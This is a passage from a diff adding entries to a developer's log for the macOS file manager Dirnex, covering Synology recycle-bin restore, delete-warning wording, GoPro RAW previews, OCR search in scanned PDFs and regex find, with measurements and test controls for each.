+mounted, DSM decides what lands in it, and rename inside it works. What it borrows is ``TrashOrigin``,
+so the restore inherits the three rules that flow already kept (never overwrite, recreate a vanished
+folder, one failure never abandons the rest) instead of re-deriving them.
+
+Two things the wiring needed. **One gate**, `putBackTargets`, read by the action *and* the menu
+validator — the "a *can this apply here* predicate lives in two places" family, where it is always
+the validator that drifts — and it asks the two sources different questions on purpose: the merged
+Trash is about the **pane**, a `#recycle` about the **row**, since that pane is an ordinary listing
+and a tree can put a bin's contents beside rows that are in no bin. And a **scaffolding prune**: the
+bin mirrors paths as real directories, so a restore left `#recycle/probe/sub` standing — litter in
+the one folder a user opens to see what they deleted. It is `rmdir` semantics, each folder listed and
+removed only while empty, stopping **at** the bin, because the backend's `removeItem` is recursive
+and the listing is what stands between it and somebody's files.
+
+**Five negative controls, each firing exactly where aimed**, which is what makes the green runs worth
+anything: drop the origin source → only the reach test fails; revert the gate → only *"offers Put
+Back"*; over-correct the gate to everything → all three narrowness tests and **not** the reach test;
+remove the prune → only the scaffolding assertion; drop the prune's empty-check → **the sibling file
+is destroyed**, which is the failure that guard exists for. 11 core tests and 9 app tests; the file
+was copied aside *with the work applied* and restored byte-identical after each control (§5's rule,
+since `git checkout` here throws the slice away).
+
+**Live on the reporter's own NAS**, driven through the shipped command with the `.sdef` verb rather
+than synthetic clicks: `docs/report.txt` went home with its bytes, the `docs/` chain it no longer had
+was **rebuilt**, and `#recycle/docs` was swept; restoring one of two files out of `media/` left
+`#recycle/media` standing with the sibling in it; and the pane re-listed itself, which no test covers.
+The share was left holding exactly the two files it started with.
+
+**The neighbouring finding was worth more than the feature, and it landed the same day.**
+`trashItem` is refused on an SMB share (measured here at last — 3328 over `NSOSStatusErrorDomain`
+−120, the file untouched), so F8 degrades to the confirmed **permanent** delete — and that delete is
+a plain `unlink`, which `vfs_recycle` catches. The confirmation promised destruction while the NAS
+quietly kept the file. Both permanent-delete sheets now ask one funnel
+(`shareRecycleBinGoverning`) whether a bin covers every path, and **⇧F8 needed it more than F8 did,
+not less**: there the user is deliberately destroying something, and a server keeping a copy is the
+fact they would most want to know. Each sheet keeps its own sentence — the fact is one fact, the
+wording is not — and the two existing bodies are untouched for the common case, so only the new
+branch needed translating (two keys × 14 languages, `#recycle` and `Dirnex` left alone;
+`scripts/check_localization_keys.py` named both before they were written and passed after, which is
+the check this file records as having to be *run* rather than documented).
+
+Three conditions gate it, and the middle one is why it says **may**: the volume must answer
+`volumeIsLocal == false` (measured `false` for the share, `true` for a disk), which stops a folder
+somebody called `#recycle` at the root of a USB drive from weakening a true warning; the directory
+must be there; and one bin must cover the whole set. Every test fails *towards* the strong wording,
+because softening wrongly is the under-warning direction. **The control needed no code edit** —
+renaming the bin aside on the live share put the original sentence back on the same file, and
+renaming it in restored the softened one, which falsifies exactly the thing the check is for where
+neutering the condition could not. Verified live in all three states: ⇧F8 on the share, ⇧F8 on a
+local disk with the byte-identical file name (unchanged), and F8's own fallback sheet on the share.
+
+**And it shipped wrong, reported within the hour, on the one path those three states did not
+include: deleting *out of* the bin.** Every other file on that share may be caught by `#recycle`;
+a file already in it cannot be, and was being offered the softened sentence — the **under**-warning
+direction the three conditions were each written to fail away from, arriving through a case none of
+them asked about. The gate asked "is there a bin on this volume", which is true *of the bin as well*.
+``ShareRecycleBin/isBinOrInside(_:)`` is the fix, deliberately broader than ``holds(_:)`` at both
+ends: the bin itself counts, since nothing moves a bin into itself, and **any** `#recycle` component
+counts rather than only the share-root one, because a bin further down is unmeasured and unsure
+should answer with the stronger warning. It is asked first, ahead of both syscalls, being the one
+condition that costs nothing. The measurement was extended to match the report — a delete from a
+*subdirectory* of the bin is permanent too, where only the bin's root had been measured — and the
+live A/B is on one share: a file inside `#recycle/wording-probe/` gets *"there's no Trash on this
+volume, so this can't be undone"*, an ordinary file beside it still gets the softened one. The
+lesson is the shape rather than the slip: **a rule that softens a warning needs its exceptions
+enumerated from the inside of the thing it softens for**, and "is there a bin here" answers for the
+whole volume, bin included.
+
+Two limits stated rather than papered over: **`#recycle` only**, not QNAP's `@Recycle`, whose
+mirroring is unmeasured and where a wrong guess restores a file to a folder nobody named; and the
+same arithmetic reaches a Synology browsed over **SFTP or FTP** — the origin carries the path's
+backend, pinned by a unit test — but was verified only over SMB.
+
+**2026-09-20 — GoPro RAW (.GPR) previews, through the first third-party binary Dirnex ships.
+VERIFIED LIVE.** Asked for as "let's also make a support of previewing go pro raw photos", which
+reads like the `.ts` fix one entry-family along — a type macOS gets wrong, routed by its bytes
+instead. It is not. Probing first (§2's rule, and the reason this took a fork in the road rather
+than a patch) settled that **macOS can decode a GPR by no route at all**: ImageIO identifies the
+container as `com.adobe.raw-image`, reports a complete status and reads the whole EXIF/DNG metadata
+block, then answers `nil` to `CreateImageAtIndex` *and* to `CreateThumbnailAtIndex`, while
+`CIRAWFilter` builds a filter whose `outputImage` is `nil`. The control is what makes that a fact
+about the codec rather than the name — renamed `.dng` it still answers `nil`, where a real `.dng`
+decodes 6000x4000 through the identical call. `Compression = 9` is GoPro's VC-5 wavelet codec, which
+macOS ships no decoder for, and the file carries **no embedded preview** (no `SubIFDs`, no
+`JPEGInterchangeFormat`) — so unlike every other RAW there is nothing to fall back on.
+
+So the options were not a routing tweak but a scope question, and it went to the user with a
+recommendation: bundle GoPro's decoder, show a metadata card, borrow the sibling JPEG, or only stop
+the hang. **Bundling was chosen.** `gpr_tools` (Apache-2.0/MIT) is built universal from a pinned
+upstream commit by `scripts/build_gpr_tools.sh`, checked in at `Packaging/Helpers/gpr_tools` (3.0 MB,
+linking nothing but `libc++` and `libSystem`) and copied into `Contents/Helpers` by a Copy Files
+phase with **CodeSignOnCopy**, so the nested Mach-O is signed and the bundle verifies.
+
+Three things the measurements decided rather than taste. **DNG is the only output worth asking for**
+— the tool's PPM and JPG are downsampled (`-r 2:1` is 2000x1500) and `-r 1:1`, the spelling that
+looks like full resolution, **writes an 11-byte 0x0 file and still exits 0**, which is why nothing
+here trusts an exit status alone. Converting to a DNG also means the photograph takes the *existing*
+`RAWImageDecoder` unchanged, so its demosaic, EXIF orientation and P3 tagging are the same code every
+ARW and NEF already takes — verified live against the camera's own sibling JPEG of the same frame.
+And it is a **process, not a library**: a truncated GPR makes the decoder `abort()` (uncaught
+`dng_exception`, SIGABRT), and a file manager puts the cursor on half-copied files as a matter of
+course, so linked in that is Dirnex gone during a preview nobody asked for.
+
+The bug underneath the feature is worth its own line: a GPR fell through to Quick Look, which does
+not merely fail on one — **it hangs**, 45 s producing nothing, where an ARW and a DNG each produce a
+thumbnail in 0.5 s. Routing it away was worth doing whatever the answer about decoding.
+
+Routing is the name **and** the bytes (`.gpr` is not GoPro's alone, and the header alone would claim
+every TIFF on the disk), with a placeholder judged by name so deciding which backend draws a row
+never costs a cloud download. `GoProRAW` in the core holds the pure half — 11 tests — and
+`GPRConverter` the spawn, with an `ArchiveIdentity`-keyed cache of three so stepping back and forth
+is free, purged on quit (measured: one temp root while running, zero after). Two negative controls:
+neutering the routing fails exactly the two routing tests while every narrowness control stays green,
+and neutering the conversion fails exactly the live decode. One pre-existing assertion **expired** in
+the pass and was fixed rather than left — `QuickViewRAWPreviewTests` pinned `.gpr` as *"left to Quick
+Look"*, which still passed only because its path did not exist. NOTICE carries the attribution,
+including the Adobe `dng_sdk` and `xmp_core` that GoPro redistributes and that no build flag can
+remove.
+
+**2026-09-19 — the find reaches a PDF that is a picture of a page. VERIFIED LIVE.** Asked for as
+"let's finish the task" over the uncommitted OCR work, which is the half the entry below left undone
+and called a milestone rather than a slice. What makes it one is that a page with no text layer has
+no answer to give and no way to be *told* it has none: `PDFPage.selection(for:)` there does not fail,
+it hands back a selection whose bounds are `(inf, inf, 0, 0)` and whose `string` is `nil` — so the
+natural `guard let` passes, `highlightedSelections` draws nothing, and a find over a scanned book
+answers **"No matches"** about 19 of every 20 pages while looking exactly like a correct answer.
+Every constant was measured against this Mac's own scans before any Swift (docs/NOTES.md ▸ Vision,
+and reading a PDF page that is a picture), and two of the measurements inverted the obvious
+implementation.
+
+- **`.fast` is unusable and reports *more* characters than `.accurate`**, because its noise is
+  characters too — `Reading` as `Readlng`, `answer` as `ansJYer`, at confidence 0.30–0.50 against
+  1.00 — so a probe scoring recognition by how much text came back prefers the broken one. **144 dpi
+  is enough and 72 is not**, and above 2× nothing changes but the bitmap. **The language list changes
+  nothing** (a page of Ukrainian read identically with three different lists and with none), so
+  there is no setting to offer and none to get wrong. **Vision does not parallelize** — 24 pages at
+  widths 2, 4 and 8 took 6.5 s every time — so one page at a time is the measurement rather than a
+  simplification to apologise for.
+- **`boundingBox(for:)` is per *word*, and a lone space answers a sentinel at the corner of the
+  page.** Every letter of `applicants` answers the same box, and a single space answers `x 0…0,
+  y 1…1` — not empty and not `nil` — so a caller that unions boxes without checking drags a match's
+  outline 484 pt across a 595 pt page. Interpolating within a line, the tempting alternative, is
+  wrong by up to 65 pt. So a match covering part of a word is drawn over that whole word: Vision's
+  own granularity, said out loud rather than faked.
+- **The outline is a quad, because a scan is not straight** (6.2° off horizontal in a scanned book,
+  28.6° in a phone photograph), and a **PDF highlight annotation's `quadrilateralPoints` are
+  relative to the annotation's own bounds** — measured by pixel count, page-space points draw
+  **nothing at all**, no error and no warning, while the spec's own corner order relative to bounds
+  covers the word exactly.
+- **A turned page moves the points and keeps the corner *labels*.** `bounds(for:)` is unrotated
+  while `draw(with:to:)` is not, so the canvas is sized with the dimensions swapped and the answer
+  turned back — `(1-y, x)`, `(1-x, 1-y)`, `(y, 1-x)`, measured by turning a page by hand. Permuting
+  the labels as well is the obvious reading and lays every quarter-turned word on its side, because
+  Vision names them in the text's own reading frame: at all four rotations the labelled
+  `topLeft`→`topRight` edge is the long one.
+
+**Three rules are what make a minute of somebody's machine affordable rather than merely possible**,
+and each was a fork with a recommendation rather than a survey. It **starts on the first keystroke
+and not before** — opening the bar costs nothing, and a query is the only thing that asks a question
+40–65 s of Neural Engine is the only way to answer. It **reads in page order and appends**, so a
+page's offsets are fixed once every page before it is known (`PagedDocumentText`) and a match found
+in the first pages keeps its number, its highlight and its place in the count while the rest arrive;
+the search is simply re-run as each lands, a few milliseconds against the half-second that produced
+the page. And it **stops the moment nobody is waiting** — the bar closed, the query cleared, another
+file under the cursor. What it keeps is **in memory and nowhere else** (`RecognizedPageStore`, keyed
+by `ArchiveIdentity` rather than by path): what this holds is the *contents* of the user's documents,
+and a store on disk would put the text of anything ever previewed — a document inside a locked vault
+included — under Application Support, where it would outlive the lock. `VaultPrivacy` exists because
+the app's own stores, not the system's caches, were what remembered a vault's file names.
+
+**The one design decision the finish added is about scrolling, and it is the "who asked" rule
+arriving on a search.** A re-run lands three times a second for the better part of a minute, and
+`applyFindMatches` ends by revealing the current match — so the document could not be read or
+scrolled while it was being read. The first shape was "reveal only when the current match moved",
+which is defensible and quietly changed the other two finding surfaces: backspacing a character
+after scrolling away leaves the match where it was, so it would have stopped scrolling back to it
+there too. Scoped to the rule instead (`QuickViewFind.isRerunForMoreText`, set by the re-read and
+consumed by the next `filterChanged`), a search the reader **asked for** always reveals and one they
+did not reveals only when the match has moved — which is the case that matters on a scan, where a
+reader who has waited out forty pages for their first hit must be taken to it. Three controls, one
+per direction.
+
+Reviewing the uncommitted work turned up four things worth naming because none of them is visible in
+a diff. Two `findReadingProgress` properties had been inserted **between an existing doc comment and
+the function it documented**, orphaning `findAnchorOffset`'s on both surfaces. The new fixture
+carried its own `settleUntil` at **10 s that gave up silently**, which is this file's own bounded-wait
+finding re-derived a third time — it now uses the shared 30 s one that records an issue, and under the
+broadest control that is exactly what it did. A *line* separator was borrowed from
+`PagedDocumentText.pageSeparator`, which happens to be the same character and answers a different
+question. And the reading's own teardown had a **handle one task could clear on another's behalf**:
+`recognitionTask = nil` ran unconditionally when a reading returned, and a new document nils that
+handle and bumps the generation — so a reading abandoned half a second earlier came back, cleared the
+*next* one's handle, and the page after that found no reading in flight and started a **second loop
+over the same document**, the two racing to read the same pages at half a second of Vision apiece.
+One `guard generation == recognitionGeneration` closes it. Nothing about it is visible in a green
+run: the answers are right either way and only the machine time doubles.
+
+Tests: **35 core in four suites** and **19 app in two**, driving a real PDF whose pages are
+rasterized words — a page drawn with glyphs cannot reproduce the state the whole feature is for —
+against a fake recognizer, with one test running the real Vision path so the render, the word ranges
+and the turn back into page coordinates are covered by something other than a fake agreeing with
+itself. The app suite reached SwiftLint's `type_body_length` and was split by concept rather than
+shaved: what the reader *sees* (the count line, the drawing, the three directions of the scrolling
+rule) and the **reading** itself (whether it happens, in what order, and the three ways of stopping
+it). **Eleven controls, each failing only its own tests**: eight app (a re-run never reveals; an
+asked-for search does not; every re-run scrolls, as before the rule; the PDF never says it is
+reading; nobody waiting is not a reason to stop; the outline shaped in page coordinates; an
+abandoned reading clearing whatever handle it finds; and nothing ever starting the reading) and three
+core (every outline drawn, the corner labels permuted, a page taken as soon as it lands). Two of them
+needed a second pass and both are findings rather than noise. The handle control **passed** first
+time, at 46 tests in 4 suites — the suite it was aimed at had just been split out and was missing
+from the filter, which the run's *count* says and its verdict does not. And the broadest one, with
+nothing starting the reading, leaves five tests waiting out their full budget and took a
+**neighbouring suite down with them**; run alone under the same control that suite passes, and the
+unmodified tree is green 2/2, so that is the main-actor starvation this file records rather than a
+second defect.
+
+Validation: both linters, all four CI scripts, **1 046** localization keys with one new plural string
+in all fourteen languages, **3 718** core tests (3 683 before), **1 415** app tests (1 396 before),
+one pre-existing known issue, five consecutive green full runs.
+
+Live, in the Debug build launched by path with the new symbols demangled out of `Dirnex.debug.dylib`
+first. A 34-page scanned manual: the count line read **"Reading 0 of 34 scanned pages"** on the first
+keystroke, climbed through **"1 of 5+ matches"** and **"1 of 6+ matches"** — the `+` that already
+means "and more to come" — and settled at **1 of 20 matches** with no `+`. The current match was
+orange on `T43 : Apply **Thread** Lock to fix.` and the rest in the find yellow, every one of them on
+the word, on pages that carry no text layer at all; ↓ read "2 of 20" with the orange moved on, and
+retyping the query answered **20 immediately with no reading line**, which is the store. Then the
+142-page book NOTES names: **"Reading 0 of 141 scanned pages"** — one short of the page count, which
+is the next paragraph — and with the reader scrolled to the *end* of the book the count climbed from
+23+ to 39+ over twelve seconds without the document moving under them, finishing at **1 of 60
+matches**.
+
+**The hour this pass lost is the one worth keeping.** PDFKit runs Live Text on a scanned page by
+itself, and it reaches the shipped app rather than only a probe: by the time a find bar is opened and
+typed into, the *displayed* page has a text layer, which is why the book reports 141 of 142 and why a
+match on page 0 is drawn as a `PDFSelection` built from **PDFKit's** word quads. Such a highlight
+read as sitting one table row too high — the exact shape a bad coordinate transform has — while a
+render of the same page with the annotation added by hand put the orange ink at rows 215–222 against
+the word's 215–226, i.e. exactly right. Both could not be true. One `NSLog` in `drawRecognizedMatch`
+settled it in one run by **never firing**: the match was not on a recognized page at all. Instrument
+the drawing before believing a placement bug — and note the screen capture is downsampled below 1×,
+so a 9 pt highlight is ~7 px and a two-pixel reading error reads as a whole row, which is the third
+instance of that rule in this file.
+
+**The handle test then failed one full run in five and passed alone every time**, which is that same
+starvation signature a third time and was not it either: the diagnostic read `unread=[] ready=2`, so
+PDFKit's Live Text had filled the *new* document's first page between showing it and the keystroke,
+leaving one page to read where the test expected two. A fixture here may not assume how many of a
+document's pages need reading — five scanned pages and every wait relative to the count before it,
+green 5/5 since.
+
+**Not verified live:** a page rotated 90°, whose transform is pinned by the core against the four
+measured cases but has no fixture here; the reading stopping when the bar closes, which is observable
+only from inside and is what three of the app tests are; and a physical Esc. **Left undone:** nothing
+from the find bar's own list — this was the last of it.
+
+**2026-09-18 (after the find options) — pattern search, once the engine that made it unaffordable
+turned out not to be the only one. VERIFIED LIVE.** Asked for as "we have undone work in history.
+let's do it", quoting the two items the entry below left undone; pattern search was chosen over the
+OCR half, which is a milestone rather than a slice. The measured reason it had been left out is in
+that entry and it is sound — and it is a fact about **ICU**, not about pattern search. Re-probed
+before any Swift: `NSRegularExpression` takes **9.4 s** on `(a+)+b` over 28 characters and Swift's
+`Regex` runs past 10 s at **20**, while macOS's own `regex(3)` — which is **TRE**, a tagged-NFA
+parallel simulation, Laurikari's copyright sitting in the SDK header — answers the same pattern in
+**0.00002 s** and a million characters of it in **0.05 s**, with capture on. Every shape that kills a
+backtracker (`^(a|aa)+$`, `^((a*)*)*$`, `^(a?){100}a{100}$`) stayed linear. So the feature cost a
+wrapper rather than an engine, and what the pass is really about is the four things that wrapper has
+to get right.
+
+- **A bracket range compares the low 8 bits of each character, and that is libc's bug rather than a
+  surprise to live with.** Found by asking what each range accepts one character at a time and
+  looking for a rule that fits every answer: `[A-Z]` takes `я` (U+044**F**) and `ё` (U+04**51**);
+  `[А-Я]`, truncated to 0x10–0x2F, takes a **space**, `!`, `-` and `中` (U+4E**2D**) while taking
+  none of `а`, `A` or `0`. Everything else in a bracket is exact, which is what makes the repair
+  small: the ranges are expanded into their own characters before the pattern is compiled
+  (`PatternSearch.expandingRanges`), which is what the engine would have done had it compared code
+  points. It costs ~1.3× at match time in the worst case measured and is sometimes faster, and the
+  cap is the engine's own — **1024 items** per bracket expression, above which `REG_ESPACE` (1024
+  compiles, 1025 does not), so a wider range is left as typed. Writing the class back down is where
+  the care went: nothing can be escaped inside a bracket, so `]` goes first, `-` last and `^`
+  anywhere but first, and a backslash in there is a literal backslash rather than an escape.
+- **Back references are refused, and it is the one refusal with a number behind it.** They are
+  available only under `REG_ENHANCED` — which is also what buys `\d \w \s \b` and the `\n`/`\t`
+  literals, so it is not a flag to drop — and with one present TRE falls back to backtracking:
+  `(a*)*\1b` costs 0.17 s at 20 characters, 2.5 s at 24 and **40 s at 28**. The bar searches on every
+  keystroke, so the pattern is turned away before it runs, with a sentence of its own: a back
+  reference is a pattern every other tool would take, and "invalid" would be the app blaming the user
+  for its own rule.
+- **Iterating means handing the engine the rest of the buffer, and the rest of a buffer has nothing
+  before it.** There is no `REG_STARTEND` here, so a second match is found by slicing — and `\bbeta`
+  over `betabeta` then reports **two** matches where there is one. One character of context plus
+  `REG_NOTBOL` is exact, since every assertion TRE has looks back exactly one character; a leftmost
+  match that starts inside the context overlaps the previous one, and the search is repeated from the
+  seam. The neighbouring half is that `REG_NOTBOL` belongs to the **value's** start rather than the
+  buffer's, which is what makes `^beta$` mean a cell holding exactly that — caught by a test, and
+  visible in the live run as `^[45]0` matching `500` and `404` while leaving `1500` alone.
+- **The locale is captured at compile time, not read at exec time** (measured in all four
+  combinations), which is the whole reason a pattern reads UTF-8 at all: a GUI-launched app has no
+  locale, so the process's is `C`, where `.` is a byte. There is no `regexec_l` and `regcomp_l` is not
+  exposed to Swift, so the lever is `uselocale` — thread-local, 0.4 µs, set around the compile alone
+  and restored, with the process locale verified untouched afterwards.
+
+Where it lives is the same answer the last two passes gave: **one option on `FilterQuery`**
+(`.pattern`), so all five surfaces gain it from the type that owns what "contains" means, and Case
+Sensitive and Whole Word keep meaning what they meant — the first is the engine's `REG_ICASE`, the
+second is this app's own word-boundary rule applied to each match rather than anything the engine
+does. A pattern that will not compile matches **nothing**, which would be an unexplained empty table,
+so the bar says why where the count goes (`Invalid pattern`, `No back references`) — one funnel every
+count already goes through, since the bar is the only place that has both the text and the options,
+and the alternative is the same sentence plumbed through five surfaces. Half-typed, an unusable
+pattern is the ordinary state of one, so it is a thing to *say* rather than a failure to report.
+
+Two types reached SwiftLint's `type_body_length` and were split by concept rather than shaved:
+`FilterQuery` into the pattern half and the word-boundary rule, and the bar into the menu and what
+the count line says.
+
+**A test asserting a count expired in a pass that had done nothing wrong**, which is the shape this
+file keeps meeting from the other side: `FilterQueryOptionNamesTests` pinned `Options.named.count ==
+2` beside the relationship it really meant, so adding a third option failed a suite that was right.
+It now asserts relationships only — no two options share a name, no option is named twice — and the
+count went with it.
+
+Tests: 18 core in a new suite, 7 app in another, plus the option-coverage tests amended to read
+against `Options.all` rather than a number. Twelve controls, each failing only its own tests: six core
+(no range expansion, no context at the seam, back references allowed, `^` told the slice is never a
+start, empty matches reported, Whole Word not applied to a pattern) and six app (the option not
+offered, the count line never saying why, one sentence for both refusals, and three pieces of
+plumbing — the table's rows, a finding surface, and the *marks*, which are built at a different call
+site from the rows).
+
+**Three of those controls were inert first time, and each was a finding rather than noise.** The
+"empty matches" one *crashed* the test host instead of failing it — a range walked past its bound,
+which is how the loop's own termination rule is written — so it was reshaped into the rule plus
+scaffolding that only keeps the two consuming loops moving, and it then failed exactly its own test.
+The first "the table is not handed the options" control changed the *marking* query and broke
+nothing, because no test read the marks under a pattern: the gap was real, and a marks test closed it
+before the control was re-aimed at `rowsMatching`, where it fires. And the first "one sentence for
+both refusals" attempt reported nothing because it had not built at all — the run's own test count,
+not its verdict, is what said so.
+
+Validation: both linters, all four CI scripts, **1 045** localization keys with three new strings in
+all fourteen languages, **3 683** core tests (3 665 before), **1 396** app tests (1 389 before), one
+pre-existing known issue.
+
+Live, in the Debug build launched by path, after quitting the running instance and backing the
+developer's own defaults domain up. With Regular Expression **off**, `be(ta|er)` over a text preview
+read **No matches** — the literal reading, since nothing in the file spells that. The app was then
+quit, the option seeded into the store by name, and relaunched: the bar came up with it already on
+(which is the persistence half, read from disk), and the same text found **1 of 4 matches** —
+`beta`, `beta`42, `beta`Only and `beer`, with `bear` left alone and the current match drawn in
+orange. `[а-я]+` found **2**, `Панорама` and `Дом`, and nothing else on a line reading `code: value_1
+= 42; value_2 = 7`; the same query with the range handed to the engine as typed answers **21**
+matches on that file, `al`, `ha`, `gamma`, `and`, `bee` and `code:` among them, which is the A/B for
+the expansion. `be(ta` said **Invalid pattern** and `(bet)\1` said **No back references**. Over the
+CSV table `^[45]0` left **2 of 3 rows**, marking `50`0 and `40`4 and not the `1500` in the next
+column, and `cv/[` emptied the table under **Invalid pattern**. The domain was restored afterwards
+and read back as it was found.
+
+**Left undone:** a match in a PDF that no text layer covers, which has no text to find without OCR —
+the other half of the entry below, and its own milestone: Vision per page, a cache, progress and
+cancellation, and a way to draw a match that does not go through `PDFPage.selection(for:)`.
+
+**2026-09-18 (last) — the find options remembered, across surfaces and across launches. VERIFIED
+LIVE.** The second of the three the entry below left undone. What decided the design was not where to
+put the value but *how the five bars would agree about it*: they are built eagerly and live as long as
+the preview does, so a value read at construction would follow you from a text preview to a CSV only
+if that CSV's surface had never been built before — a rule whose answer depends on which files you
+happened to open first, which is worse than not persisting at all, because it looks like it works. So
+there is one store and the bars read it, and its notification is what puts the other four in step.
+That is not waste: a table still holding a filtered CSV has to be right about it before it is shown
+again, and an idle bar's re-run costs a cleared match set, since every `filterChanged` guards on an
+empty query.
+
+- **Stored by name, not by the option set's raw bits.** `FilterQuery.Options`' bit layout is a core
+  implementation detail the type has never promised to keep, and writing it into a preferences domain
+  would quietly make it a compatibility surface; a name also says what it is in a `defaults read`,
+  where `3` does not. `FilterQuery.Options.all` and `.named` are spelled out beside the declarations —
+  an `OptionSet` has no `allCases` — and are what the core's stored names *and* the bar's menu titles
+  are each checked against, so a third option cannot ship unstorable or unofferable.
+- **The tolerant read needed no defensive code, which one probe settled.**
+  `UserDefaults.stringArray(forKey:)` answers `nil` — never a partial value — for a number, a bare
+  string, an array of numbers and even an array that is only *partly* strings, so a hand-edited or
+  newer-build value falls back to the default rather than half-applying. An unknown name is dropped
+  and the rest still read.
+- **The domain is a required argument, and that is the change with the blast radius.**
+  `QuickViewPreviewView` now takes a `QuickViewFindOptionsStore` — fifteen call sites, three in the app
+  and twelve in the tests — rather than defaulting to `.standard` the way `tableLayoutDefaults` does.
+  The difference is that this store is **read** on the way in, not only written: a test asserting that
+  the options start off would otherwise have been asserting something about whoever ran it, and would
+  fail on the machine of anyone who had turned Case Sensitive on in the real app. Positive control: the
+  key is absent from `com.dirnex.Dirnex` after a full app run.
+- **`resetOptions()` went with it**, having had no callers since it was written the day before — and it
+  is the one thing that would have fought persistence.
+
+Tests: 5 core in a new suite, 8 app in another. Six controls. Two core (an option with no name; a read
+that case-folds) and four app (the store never writing; the bar not observing; a surface on a store of
+its own; the notification unscoped), each failing only its own tests.
+
+**One control was inert and is the finding worth keeping.** "A bar hears its own store and no other"
+first asserted the bar's *options*, and passed with the observer's `object:` scoping deliberately
+removed — because a bar reads its own store, so an unscoped observer still reports the right value.
+What an unscoped bar does differently is run `changed()` for a change that was never its own, so the
+observable had to be the **re-search**, counted through the bar's own `changed` closure, with the
+narrowness half beside it or "hears nothing" would pass just as well. The general shape this file
+keeps meeting: a control has to change the observable, not merely the code path — and a reader that
+reads *its own source* cannot see who else was talking to it.
+
+Validation: both linters, all four CI scripts, 1 042 localization keys unchanged (a persistence pass
+adds no user-facing text), 3 665 core tests (3 660 before), 1 389 app tests (1 381 before), one
+pre-existing known issue.
+
+Live, in the Debug build launched by path. Over a text preview `beta` found **4**; Case Sensitive
+took it to **2**, and the app wrote `Dirnex.quickView.findOptions = (caseSensitive)` — by name. The
+same preview switched to a CSV, whose table surface and bar were built fresh afterwards, narrowed
+**3 rows to 1**. Then the app was quit, confirmed gone, and relaunched by path: a new window, a new
+find bar, and `beta` found **2** with **✓ Case Sensitive** in the reopened menu. Turning it back off
+removed the key from the domain and the count returned to **4** — so the removal path was exercised
+live too, and the developer's own domain was left exactly as it was found.
+
+**Left undone:** pattern search, for the measured reason in the entry below; and a match in a PDF that
+no text layer covers, which has no text to find without OCR.
+
+**2026-09-18 (later) — the find bar's three remaining gaps: Return, the menu item's name, and search
+options. VERIFIED LIVE.** Asked for as "let's do the other left undone" — the three the entry below
+listed after closing the `QLPreviewView` one. Each was probed before any Swift, and two of the three
+probes overturned the obvious implementation.
+
+- **Return steps to the next match, ⇧Return to the previous.** The probe is the finding: measured
+  through `interpretKeyEvents`, a field editor turns Return, ⇧Return **and keypad Enter** all into
+  the same `insertNewline:`, and `insertLineBreak:` — the natural guess for the shifted spelling — is
+  never sent. So the selector cannot carry the direction and the modifiers must, which lands it in
+  the family this file records under Testing: a rule reading `NSEvent.modifierFlags` inside itself
+  has one reachable test case. `filterCommand` takes them as a **defaulted parameter**, evaluated at
+  each call, so production reads the live keyboard and a test hands over `.shift`.
+  - The fork is by *kind* of surface, not by a flag: a host that **finds** steps, and one that
+    **narrows** still hands the keyboard back, because there the rows are the result and ↑/↓ already
+    walk them. `returnStepsResults` is a requirement with no default in the base protocol and one
+    answer per sub-protocol — the shape `stepFilterResult` already had, chosen over a default in both
+    places so which witness wins is not left to overload resolution at each conformance. The built
+    dylib confirms all five surfaces resolved it.
+  - It also answers `false` when there is **nothing to step to**, so with nothing typed or nothing
+    found the key falls through to what it always did rather than going dead. Tab is untouched and is
+    what still leaves the field.
+- **The menu item says what ⌥⌘F would do.** It read "Filter" over a PDF, which is the wrong word for
+  three of the five surfaces. It now retitles live — **Find…** over a text, a rendered page or a PDF,
+  and the catalog's own **Filter** over a table or a tree — the same way Edit and Compare By Contents
+  already name what they would launch. The filter branch reads the title back from `LocalizedCatalog`
+  rather than spelling it, so the registry's string is not duplicated; the palette keeps the catalog
+  title, which is what its fuzzy search matches, and the command's keywords already carry "find" and
+  "search". The choice is split into `filterItemTitle(finding:)` so it can be tested without a window.
+- **Case Sensitive and Whole Word, on all five surfaces.** Scope was settled by measurement rather
+  than taste: `NSRegularExpression` is only 3–5× the current matcher over 4 MB (15–21 ms against
+  4.3 ms), so *performance* is no argument against pattern search — but `(a+)+b` over **31
+  characters** ran past a 10 s cap with the `stop` pointer never consulted, because it is only read
+  *between* matches. `CancellationFlag`, which every search here relies on, cannot interrupt one
+  backtracking match, and the bar searches on every keystroke. Recorded, and regex left out.
+  - **One type owns what "contains" means.** Every caller that reached for
+    `DelimitedTable.foldedContains` directly now asks `FilterQuery.matchesBytes`, so the table, the
+    three trees and the three finding surfaces cannot drift into six readings of one box — the same
+    reason `PDFDocument.findString` was turned down a day earlier. `foldedContains` had no callers
+    left and went. The options default to `[]` at every entry point, which is asserted rather than
+    assumed: all 3 646 core tests passed unchanged before a single new one was added.
+  - **The word-boundary rule needed two measurements.** `isAlphabetic` is **false** for U+0301 and
+    **true** for U+05B4, two scalars of one general category, so the mark categories are named beside
+    the property — without them a decomposed `café` would whole-word-match `cafe`, the opposite of
+    what the accent-counting rule beside it says. And at a byte boundary the neighbouring character
+    cannot be read from the byte: "any non-ASCII byte is part of a word" is the cheap rule and it
+    misses `beta` in `“beta”`, silently, in any typeset document. UTF-8 self-synchronizes, so the
+    scalar either side is decoded exactly, at bounded cost.
+  - The options live in the search field's **magnifying-glass menu**, which costs a bar that is
+    already four controls wide at a 320 pt pane no width at all — the localization budget this file
+    has four entries about. `NSSearchField` **copies** that template to display it, so the menu is
+    rebuilt from the stored value rather than by toggling the item the action received. They survive
+    a new file, because an option is a mode rather than content; they are deliberately **not** written
+    to disk and each surface has its own bar, which is one stated limit instead of a preference key, a
+    fifth store to inject and a process-wide value for tests to leak through.
+  - The bar reached SwiftLint's `type_body_length` and was split by concept
+    (`QuickViewTableFilterBar+Options`), not shaved.
+
+Tests: 14 core in a new suite, 15 app in two. Six controls, each failing only its own tests and no
+other suite: Return never stepping (2 tests), ⇧Return ignoring the modifier (1), one title for both
+states (1), the case option ignored (3 core), no scalar being a word character (5 core), and the
+table's matcher not being handed the options (1 app — the plumbing control, which is the one a
+five-surface change can silently miss).
+Validation: both linters, all four CI scripts, **1 042** localization keys with three new strings
+carried into all 14 languages, 3 660 core tests (3 646 before), 1 381 app tests (1 361 before), one
+pre-existing known issue.
+
+Live, in the Debug build launched by path, with the new symbols demangled out of `Dirnex.debug.dylib`
+and the three strings read back out of the compiled `.strings`. Over `vite.config.ts`: `beta` found
+**5** matches, Whole Word took it to **4** with the `betaOnly` highlight gone, and reopening the menu
+showed **✓ Whole Word** — the template-copy concern, answered on screen. The options then survived a
